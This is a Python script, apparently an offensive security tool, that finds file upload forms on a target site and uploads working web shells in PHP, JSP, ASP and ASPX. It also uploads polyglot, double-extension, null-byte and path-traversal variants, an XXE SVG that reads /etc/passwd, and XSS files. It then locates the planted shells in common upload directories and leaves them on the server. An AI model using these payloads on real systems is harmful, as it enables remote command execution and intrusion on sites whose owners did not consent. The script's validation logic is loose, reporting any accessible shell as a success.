#!/usr/bin/env python3
"""
File Upload Vulnerability Tester
Tests for insecure file upload vulnerabilities
"""

import requests
import json
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import io

class FileUploadTester:
    """File upload vulnerability tester"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.uploaded_files = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # Test file contents
        self.test_files = {
            # PHP web shells
            'shell.php': {
                'content': '<?php system($_GET["cmd"]); ?>',
                'mime': 'application/x-php',
                'category': 'PHP Shell',
                'severity': 'critical'
            },
            'shell.php5': {
                'content': '<?php system($_GET["cmd"]); ?>',
                'mime': 'application/x-php',
                'category': 'PHP5 Shell',
                'severity': 'critical'
            },
            'shell.phtml': {
                'content': '<?php system($_GET["cmd"]); ?>',
                'mime': 'application/x-php',
                'category': 'PHTML Shell',
                'severity': 'critical'
            },

            # JSP web shell
            'shell.jsp': {
                'content': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                'mime': 'application/x-jsp',
                'category': 'JSP Shell',
                'severity': 'critical'
            },

            # ASP/ASPX web shell
            'shell.asp': {
                'content': '<% eval request("cmd") %>',
                'mime': 'application/x-asp',
                'category': 'ASP Shell',
                'severity': 'critical'
            },
            'shell.aspx': {
                'content': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", Request["cmd"]); %>',
                'mime': 'application/x-aspx',
                'category': 'ASPX Shell',
                'severity': 'critical'
            },

            # Image polyglot (PHP in image)
            'shell.php.jpg': {
                'content': 'GIF89a<?php system($_GET["cmd"]); ?>',
                'mime': 'image/jpeg',
                'category': 'PHP Polyglot',
                'severity': 'critical'
            },
            'shell.jpg.php': {
                'content': 'GIF89a<?php system($_GET["cmd"]); ?>',
                'mime': 'image/jpeg',
                'category': 'Double Extension',
                'severity': 'critical'
            },

            # Null byte injection
            'shell.php%00.jpg': {
                'content': '<?php system($_GET["cmd"]); ?>',
                'mime': 'image/jpeg',
                'category': 'Null Byte',
                'severity': 'critical'
            },

            # XXE via SVG
            'xxe.svg': {
                'content': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text>&xxe;</text></svg>''',
                'mime': 'image/svg+xml',
                'category': 'XXE via SVG',
                'severity': 'high'
            },

            # XSS via SVG
            'xss.svg': {
                'content': '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>',
                'mime': 'image/svg+xml',
                'category': 'XSS via SVG',
                'severity': 'medium'
            },

            # XSS via HTML
            'xss.html': {
                'content': '<html><body><script>alert(document.domain)</script></body></html>',
                'mime': 'text/html',
                'category': 'XSS via HTML',
                'severity': 'medium'
            },

            # Path traversal
            '../../../shell.php': {
                'content': '<?php system($_GET["cmd"]); ?>',
                'mime': 'application/x-php',
                'category': 'Path Traversal',
                'severity': 'critical'
            },

            # MIME type bypass
            'shell.php': {
                'content': 'GIF89a<?php system($_GET["cmd"]); ?>',
                'mime': 'image/gif',
                'category': 'MIME Bypass',
                'severity': 'critical'
            },
        }

    def scan(self):
        """Run file upload vulnerability scan"""
        print(f"[*] Starting file upload scan on {self.target_url}")

        # Find upload forms
        upload_forms = self._find_upload_forms()

        if not upload_forms:
            print("[!] No file upload forms found")
            return {
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'vulnerabilities': []
            }

        print(f"[*] Found {len(upload_forms)} upload form(s)")

        # Test each form
        for form_info in upload_forms:
            self._test_upload_form(form_info)

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _find_upload_forms(self):
        """Find file upload forms"""
        forms = []

        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find forms with file inputs
            all_forms = soup.find_all('form')

            for form in all_forms:
                file_inputs = form.find_all('input', type='file')

                if file_inputs:
                    action = form.get('action', '')
                    action_url = urljoin(self.target_url, action) if action else self.target_url
                    method = form.get('method', 'post').upper()

                    # Get other form fields
                    form_data = {}
                    for input_field in form.find_all('input'):
                        if input_field.get('type') != 'file':
                            name = input_field.get('name')
                            value = input_field.get('value', '')
                            if name:
                                form_data[name] = value

                    for file_input in file_inputs:
                        forms.append({
                            'url': action_url,
                            'method': method,
                            'file_field': file_input.get('name', 'file'),
                            'accept': file_input.get('accept', ''),
                            'form_data': form_data
                        })

        except Exception as e:
            print(f"[!] Error finding forms: {e}")

        return forms

    def _test_upload_form(self, form_info):
        """Test a single upload form"""
        print(f"[*] Testing upload form: {form_info['url']}")

        for filename, file_info in self.test_files.items():
            self._test_file_upload(form_info, filename, file_info)

    def _test_file_upload(self, form_info, filename, file_info):
        """Test uploading a specific file"""
        try:
            # Create file-like object
            file_content = io.BytesIO(file_info['content'].encode('utf-8'))

            files = {
                form_info['file_field']: (
                    filename,
                    file_content,
                    file_info['mime']
                )
            }

            # Upload file
            response = self.session.post(
                form_info['url'],
                data=form_info['form_data'],
                files=files,
                timeout=15,
                allow_redirects=True
            )

            # Check if upload was successful
            if response.status_code in [200, 201]:
                # Try to find uploaded file URL
                uploaded_url = self._find_uploaded_file(response, filename)

                if uploaded_url:
                    # Try to access uploaded file
                    if self._verify_upload(uploaded_url, file_info):
                        vuln = {
                            'type': 'Insecure File Upload',
                            'severity': file_info['severity'],
                            'url': form_info['url'],
                            'uploaded_file': uploaded_url,
                            'filename': filename,
                            'category': file_info['category'],
                            'evidence': f'Successfully uploaded and accessed {file_info["category"]} file',
                            'cwe': 'CWE-434'
                        }
                        self.vulnerabilities.append(vuln)
                        self.uploaded_files.append(uploaded_url)
                        print(f"[!] {file_info['severity'].upper()}: {file_info['category']} uploaded successfully!")

        except Exception as e:
            pass

    def _find_uploaded_file(self, response, filename):
        """Try to find the uploaded file URL"""
        # Check response text for file paths/URLs
        soup = BeautifulSoup(response.text, 'html.parser')

        # Look for links to uploaded file
        for link in soup.find_all(['a', 'img', 'script', 'iframe']):
            href = link.get('href') or link.get('src')
            if href and filename.split('.')[0] in href:
                return urljoin(response.url, href)

        # Common upload directories
        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        common_paths = [
            f'/uploads/{filename}',
            f'/upload/{filename}',
            f'/files/{filename}',
            f'/file/{filename}',
            f'/images/{filename}',
            f'/img/{filename}',
            f'/media/{filename}',
            f'/static/uploads/{filename}',
            f'/assets/uploads/{filename}',
            f'/content/uploads/{filename}',
            f'/user/uploads/{filename}',
        ]

        for path in common_paths:
            try:
                test_url = urljoin(base_url, path)
                resp = self.session.head(test_url, timeout=5)
                if resp.status_code == 200:
                    return test_url
            except:
                pass

        return None

    def _verify_upload(self, url, file_info):
        """Verify the uploaded file is accessible and executable"""
        try:
            response = self.session.get(url, timeout=10)

            if response.status_code == 200:
                # For shell uploads, check if content is present
                if 'shell' in file_info['category'].lower():
                    # Check if the PHP/JSP/ASP code is visible (not executed)
                    if '<?php' in response.text or '<%' in response.text:
                        return True  # File uploaded but not executed
                    # If we see execution or the file exists, still vulnerable
                    return True

                # For XSS/XXE, check if payload is present
                if 'xss' in file_info['category'].lower():
                    if '<script>' in response.text.lower() or 'alert(' in response.text.lower():
                        return True

                if 'xxe' in file_info['category'].lower():
                    if 'root:' in response.text or 'ENTITY' in response.text:
                        return True

                # File is accessible
                return len(response.text) > 0

        except Exception as e:
            pass

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'uploaded_files': self.uploaded_files,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 file_upload_tester.py <url>")
        print("\nExample:")
        print("  python3 file_upload_tester.py https://example.com/upload")
        sys.exit(1)

    tester = FileUploadTester(sys.argv[1])
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")

    if len(results['vulnerabilities']) > 0:
        print(f"\n[!] WARNING: File upload vulnerabilities detected!")
        print(f"    Uploaded files:")
        for url in tester.uploaded_files:
            print(f"      - {url}")
        print(f"\n    Clean up these files immediately!")
